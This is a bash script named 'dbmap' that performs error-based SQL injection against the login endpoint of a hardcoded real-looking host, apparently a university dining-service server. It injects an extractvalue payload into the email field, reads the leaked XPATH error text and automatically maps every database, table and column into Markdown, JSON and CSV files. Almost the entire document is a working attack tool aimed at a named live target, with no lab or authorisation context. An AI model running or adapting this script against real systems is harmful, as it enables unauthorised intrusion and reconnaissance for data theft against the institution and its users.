#!/bin/bash

# =============================================================================
#  dbmap - Database Schema Mapper via SQL Injection (error-based)
#  Modes: --scan (list DBs), --extract (bulk mapping), --db (single DB)
# =============================================================================

# --- CONFIGURATION ------------------------------------------------------------
HOST_API="comedor.uncp.edu.pe"
API_PATH="/server"
TIMEOUT=10
MAX_RETRIES=3
DELAY=0.3

# --- COLORS -------------------------------------------------------------------
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- HELPERS ------------------------------------------------------------------
log()   { echo -e "${BLUE}[*]${NC} $1"; }
success(){ echo -e "${GREEN}[+]${NC} $1"; }
error() { echo -e "${RED}[!]${NC} $1" >&2; }
warning(){ echo -e "${YELLOW}[!]${NC} $1"; }

# --- SQL INJECTION (error-based, extractvalue) --------------------------------
sqli_exec() {
    local q="$1"
    local retries=0
    local payload="' OR extractvalue(1, concat(0x7e, ($q))) #"
    
    while [ $retries -lt $MAX_RETRIES ]; do
        local res=$(curl -k -s -X POST "https://$HOST_API$API_PATH/login.php" \
            -H "Host: $HOST_API" \
            --connect-timeout $TIMEOUT \
            --form-string "data={\"email\":\"$payload\",\"password\":\"any\"}" 2>/dev/null)
        
        local result=$(echo "$res" | grep -oP "XPATH syntax error: '~\K[^']+" | head -1)
        if [ -n "$result" ]; then
            echo "$result"
            return 0
        fi
        retries=$((retries + 1))
        [ $retries -lt $MAX_RETRIES ] && sleep $DELAY
    done
    return 1
}

# --- SINGLE DATABASE MAPPING --------------------------------------------------
map_single_db() {
    local DB_TARGET="$1"
    local BASE_OUTPUT_DIR="$2"
    
    if [ -z "$DB_TARGET" ] || [ -z "$BASE_OUTPUT_DIR" ]; then
        error "Usage: map_single_db <DB> <base_dir>"
        return 1
    fi
    
    local OUTPUT_DIR="${BASE_OUTPUT_DIR}/${DB_TARGET}"
    mkdir -p "$OUTPUT_DIR"
    
    local OUTPUT_MD="$OUTPUT_DIR/modelo_${DB_TARGET}.md"
    local OUTPUT_JSON="$OUTPUT_DIR/modelo_${DB_TARGET}.json"
    local OUTPUT_CSV="$OUTPUT_DIR/modelo_${DB_TARGET}.csv"
    
    log "Processing DB: ${CYAN}$DB_TARGET${NC} -> $OUTPUT_DIR"
    
    cat > "$OUTPUT_MD" << EOF
# Database Schema - $DB_TARGET

**Generated:** $(date '+%Y-%m-%d %H:%M:%S')
**Host:** $HOST_API
**Method:** Error-based (extractvalue)

## Tables

EOF
    
    cat > "$OUTPUT_JSON" << EOF
{
  "database": "$DB_TARGET",
  "generated": "$(date -Iseconds)",
  "host": "$HOST_API",
  "method": "error-based",
  "tables": [
EOF
    
    echo "Database,Table,Column,Type,Nullable,Key" > "$OUTPUT_CSV"
    
    local COUNT=$(sqli_exec "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='$DB_TARGET'")
    if [ -z "$COUNT" ] || [ "$COUNT" -eq 0 ]; then
        warning "No tables found in $DB_TARGET"
        return 0
    fi
    
    for (( t=0; t<COUNT; t++ )); do
        local TABLE=$(sqli_exec "SELECT table_name FROM information_schema.tables WHERE table_schema='$DB_TARGET' LIMIT $t,1")
        [ -z "$TABLE" ] && continue
        TABLE=$(echo "$TABLE" | sed 's/[^a-zA-Z0-9_]//g')
        
        echo -ne "\r${CYAN}[$DB_TARGET] Progress: $((t*100/COUNT))%${NC} Table: $TABLE ($((t+1))/$COUNT)    "
        
        local COL_COUNT=$(sqli_exec "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='$TABLE' AND table_schema='$DB_TARGET'")
        
        echo "## Table: \`$TABLE\`" >> "$OUTPUT_MD"
        echo "" >> "$OUTPUT_MD"
        echo "| # | Column | Type | Nullable | Key |" >> "$OUTPUT_MD"
        echo "|---|--------|------|----------|-----|" >> "$OUTPUT_MD"
        
        [ $t -gt 0 ] && echo "    }," >> "$OUTPUT_JSON"
        echo "    {" >> "$OUTPUT_JSON"
        echo "      \"name\": \"$TABLE\"," >> "$OUTPUT_JSON"
        echo "      \"columns\": [" >> "$OUTPUT_JSON"
        
        for (( c=0; c<COL_COUNT; c++ )); do
            local COLUMN=$(sqli_exec "SELECT column_name FROM information_schema.columns WHERE table_name='$TABLE' AND table_schema='$DB_TARGET' LIMIT $c,1")
            [ -z "$COLUMN" ] && continue
            
            local DATA_TYPE=$(sqli_exec "SELECT data_type FROM information_schema.columns WHERE table_name='$TABLE' AND table_schema='$DB_TARGET' LIMIT $c,1")
            local IS_NULLABLE=$(sqli_exec "SELECT is_nullable FROM information_schema.columns WHERE table_name='$TABLE' AND table_schema='$DB_TARGET' LIMIT $c,1")
            local COLUMN_KEY=$(sqli_exec "SELECT column_key FROM information_schema.columns WHERE table_name='$TABLE' AND table_schema='$DB_TARGET' LIMIT $c,1")
            
            echo "| $c | \`$COLUMN\` | ${DATA_TYPE:-unknown} | ${IS_NULLABLE:-YES} | ${COLUMN_KEY:-} |" >> "$OUTPUT_MD"
            
            [ $c -gt 0 ] && echo "," >> "$OUTPUT_JSON"
            echo -n "          {" >> "$OUTPUT_JSON"
            echo -n "\"name\":\"$COLUMN\"" >> "$OUTPUT_JSON"
            [ -n "$DATA_TYPE" ] && echo -n ",\"type\":\"$DATA_TYPE\"" >> "$OUTPUT_JSON"
            [ -n "$IS_NULLABLE" ] && echo -n ",\"nullable\":\"$IS_NULLABLE\"" >> "$OUTPUT_JSON"
            [ -n "$COLUMN_KEY" ] && echo -n ",\"key\":\"$COLUMN_KEY\"" >> "$OUTPUT_JSON"
            echo -n "}" >> "$OUTPUT_JSON"
            
            echo "\"$DB_TARGET\",\"$TABLE\",\"$COLUMN\",\"${DATA_TYPE:-unknown}\",\"${IS_NULLABLE:-YES}\",\"${COLUMN_KEY:-}\"" >> "$OUTPUT_CSV"
        done
        
        echo "" >> "$OUTPUT_JSON"
        echo "        ]" >> "$OUTPUT_JSON"
        echo "" >> "$OUTPUT_MD"
        
        sleep $DELAY
    done
    
    echo "    }" >> "$OUTPUT_JSON"
    echo "  ]" >> "$OUTPUT_JSON"
    echo "}" >> "$OUTPUT_JSON"
    
    echo ""
    success "DB $DB_TARGET completed → $OUTPUT_DIR"
    return 0
}

# --- SCAN ALL DATABASES (including system schemas) ---------------------------
scan_databases() {
    local output_file=""
    while [ $# -gt 0 ]; do
        case "$1" in
            -o)
                shift
                output_file="$1"
                shift
                ;;
            *)
                error "Unknown option: $1"
                return 1
                ;;
        esac
    done
    
    log "Scanning all databases on $HOST_API (error-based)..."
    
    # Get total number of schemas (all, no exclusion)
    local total=$(sqli_exec "SELECT COUNT(*) FROM information_schema.schemata")
    if [ -z "$total" ] || [ "$total" -eq 0 ]; then
        error "Failed to get database count. Injection may not work."
        return 1
    fi
    
    success "Total databases found: $total"
    echo ""
    
    if [ -n "$output_file" ]; then
        if [ -f "$output_file" ]; then
            warning "File '$output_file' exists. Overwrite? (y/n)"
            read -r respuesta
            [[ ! "$respuesta" =~ ^[yY]$ ]] && { error "Cancelled."; return 1; }
        fi
        > "$output_file"
        log "Saving list to: $output_file"
    fi
    
    for (( i=0; i<total; i++ )); do
        local db=$(sqli_exec "SELECT schema_name FROM information_schema.schemata LIMIT $i,1")
        if [ -n "$db" ]; then
            echo "  $db"
            [ -n "$output_file" ] && echo "$db" >> "$output_file"
        fi
        echo -ne "\r${CYAN}Progress: $((i*100/total))%${NC}   "
    done
    echo ""
    success "Scan completed."
    [ -n "$output_file" ] && log "List saved to $(realpath "$output_file")"
}

# --- BULK EXTRACTION FROM LIST FILE ------------------------------------------
extract_from_list() {
    local list_file="$1"
    
    if [ -z "$list_file" ]; then
        error "Usage: $0 --extract <list_file.txt>"
        return 1
    fi
    
    if [ ! -f "$list_file" ]; then
        error "File '$list_file' not found."
        return 1
    fi
    
    local dbs=()
    while IFS= read -r line; do
        line=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [ -n "$line" ] && dbs+=("$line")
    done < "$list_file"
    
    if [ ${#dbs[@]} -eq 0 ]; then
        error "No valid database names in '$list_file'."
        return 1
    fi
    
    log "Processing ${#dbs[@]} databases from '$list_file'"
    
    local TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    local BASE_OUTPUT_DIR="output_${TIMESTAMP}"
    mkdir -p "$BASE_OUTPUT_DIR"
    log "Output root: $BASE_OUTPUT_DIR"
    
    local total_start=$SECONDS
    local success_count=0
    local fail_count=0
    
    for db in "${dbs[@]}"; do
        if map_single_db "$db" "$BASE_OUTPUT_DIR"; then
            ((success_count++))
        else
            ((fail_count++))
        fi
    done
    
    local total_elapsed=$((SECONDS - total_start))
    echo ""
    success "Bulk extraction completed in ${total_elapsed}s"
    log "Successful: $success_count | Failed: $fail_count"
    log "Results stored in: $BASE_OUTPUT_DIR"
}

# --- HELP --------------------------------------------------------------------
show_help() {
    cat << EOF
dbmap - Database Schema Mapper via SQL Injection

Usage:
  $0 --scan [-o file]           List all databases on the target.
                                 With -o, save list to file.
  $0 --extract <list_file>      Map all databases listed in the file.
  $0 --db <db_name>             Map a single database.
  $0 -h | --help                Show this help.

Output structure (for --extract or --db):
  output_YYYYMMDD_HHMMSS/
    └── <db_name>/
          ├── modelo_<db>.md
          ├── modelo_<db>.json
          └── modelo_<db>.csv

Examples:
  $0 --scan -o all_dbs.txt
  $0 --scan
  $0 --extract all_dbs.txt
  $0 --db db_tesis
  $0 --help

Notes:
  - Uses error-based injection (extractvalue) with retries.
  - The list file for --extract must contain one database name per line.
  - System databases (mysql, information_schema, etc.) are included in --scan.
EOF
}

# --- MAIN --------------------------------------------------------------------
if [ $# -eq 0 ]; then
    show_help
    exit 0
fi

MODE=""
SCAN_OUTPUT_FILE=""
EXTRACT_LIST_FILE=""
SINGLE_DB=""

while [ $# -gt 0 ]; do
    case "$1" in
        --scan)
            MODE="scan"
            shift
            while [ $# -gt 0 ]; do
                case "$1" in
                    -o)
                        shift
                        [ -z "$1" ] || [[ "$1" == -* ]] && { error "Missing filename for -o"; exit 1; }
                        SCAN_OUTPUT_FILE="$1"
                        shift
                        ;;
                    *)
                        error "Unknown option for --scan: $1"
                        exit 1
                        ;;
                esac
            done
            ;;
        --extract)
            MODE="extract"
            shift
            [ $# -eq 0 ] && { error "Missing list file for --extract"; exit 1; }
            EXTRACT_LIST_FILE="$1"
            shift
            ;;
        --db)
            MODE="db"
            shift
            [ $# -eq 0 ] && { error "Missing database name for --db"; exit 1; }
            SINGLE_DB="$1"
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

case "$MODE" in
    scan)
        clear
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
        echo -e "║                     DATABASE SCAN MODE                          ║"
        echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
        if [ -n "$SCAN_OUTPUT_FILE" ]; then
            scan_databases -o "$SCAN_OUTPUT_FILE"
        else
            scan_databases
        fi
        ;;
    extract)
        clear
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
        echo -e "║                    BULK EXTRACTION MODE                         ║"
        echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
        extract_from_list "$EXTRACT_LIST_FILE"
        ;;
    db)
        clear
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
        echo -e "║                   SINGLE DATABASE MODE                          ║"
        echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)
        BASE_OUTPUT_DIR="output_${TIMESTAMP}"
        mkdir -p "$BASE_OUTPUT_DIR"
        log "Output directory: $BASE_OUTPUT_DIR"
        map_single_db "$SINGLE_DB" "$BASE_OUTPUT_DIR"
        log "Results saved in: $BASE_OUTPUT_DIR/$SINGLE_DB/"
        ;;
    *)
        error "No valid mode specified."
        show_help
        exit 1
        ;;
esac

exit 0